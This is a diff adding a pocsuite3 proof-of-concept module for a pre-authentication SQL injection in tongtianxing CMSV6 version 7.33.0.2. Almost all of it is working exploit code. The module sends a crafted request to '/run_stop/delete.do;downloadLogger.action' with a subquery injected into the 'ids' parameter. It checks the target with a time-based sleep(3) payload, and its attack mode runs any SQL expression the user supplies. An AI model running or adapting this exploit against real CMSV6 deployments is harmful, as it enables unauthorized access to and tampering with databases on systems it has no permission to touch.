@@ -1,0 +1,71 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from pocsuite3.api import (
+    minimum_version_required, POCBase, register_poc, requests, logger,
+    OptString, OrderedDict,
+    random_str,
+)
+
+minimum_version_required('1.9.6')
+
+
+class DemoPOC(POCBase):
+    vulID = '0'
+    version = '1'
+    author = 'changge'
+    vulDate = '2024-04-02'
+    createDate = '2024-04-02'
+    updateDate = '2024-04-02'
+    references = []
+    name = 'tongtianxing CMSV6 Pre-Auth SQL Injection (CT-1108574)'
+    appPowerLink = ''
+    appName = 'CMSV6'
+    appVersion = '7.33.0.2_20240305'
+    vulType = 'SQL Injection'
+    desc = 'Vulnerability description'
+    samples = ['']
+    install_requires = ['']
+    pocDesc = 'User manual of poc'
+    dork = {'zoomeye': ''}
+    suricata_request = ''
+    suricata_response = ''
+
+    def _options(self):
+        o = OrderedDict()
+        # o['param'] = OptString('', description='The param')
+        return o
+
+    def _exploit(self, param=''):
+        if not self._check(dork=''):
+            return False
+        url = self.url+"/run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT("+param+"))tdpw)--+&loadAll=1"
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Connection": "close", "Accept-Encoding": "gzip, deflate"}
+        res = requests.get(url, headers=headers)
+        return res
+
+    def _verify(self):
+        result = {}
+        param = 'sleep(3)'
+        res = self._exploit(param)
+        res_time = res.elapsed.total_seconds()
+        if res_time >= 3:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            result['VerifyInfo'][param] = res
+        return self.parse_output(result)
+
+    def _attack(self):
+        result = {}
+        param = self.get_option('param')
+        res = self._exploit(param)
+        result['VerifyInfo'] = {}
+        result['VerifyInfo']['URL'] = self.url
+        result['VerifyInfo'][param] = res
+        return self.parse_output(result)
+
+    def _shell(self):
+        return self._verify()
+
+
+register_poc(DemoPOC)
